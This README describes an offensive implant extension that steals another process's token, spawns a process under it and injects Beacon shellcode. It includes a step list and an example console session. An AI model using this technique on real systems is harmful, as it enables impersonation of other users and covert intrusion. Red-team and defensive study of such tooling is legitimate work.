## SpawnWith
 
An experimental Beacon Object File (BOF) that provides an alternative to the `spawnas` and `inject` commands.  This exposes a new command, `spawn_with [pid] [listener]`, that performs the following:

1. Obtain a handle to the target process.
2. Obtain a handle to the process' primary token.
3. Duplicate the parimary token to an impersonation token.
4. Get the Beacon `spawnto` value.
5. Attempt to spawn a new process with the duplicated token using `CreateProcessWithTokenW`.
    5.5 If this attempt fails, try `CreateProcessAsUserW`.
6. Inject the Beacon shellcode into the spawned process.
    6.5 Link to the Beacon in the case of P2P.


### Example

```
beacon> getuid
[*] You are DESKTOP-1U6AHIU\Daniel (admin)

beacon> ps
22656 21972 wordpad.exe                            x64   1           DESKTOP-1U6AHIU\test_user

beacon> spawnto x64 %windir%\sysnative\notepad.exe

beacon> spawn_with 22656 tcp-local
[*] Task Beacon to run windows/beacon_bind_tcp (127.0.0.1:4444)
[+] received output:

Spawned PID 45668 and injected 297472 bytes

[+] established link to child beacon: 192.168.0.195
```

![Beacons](beacons.png)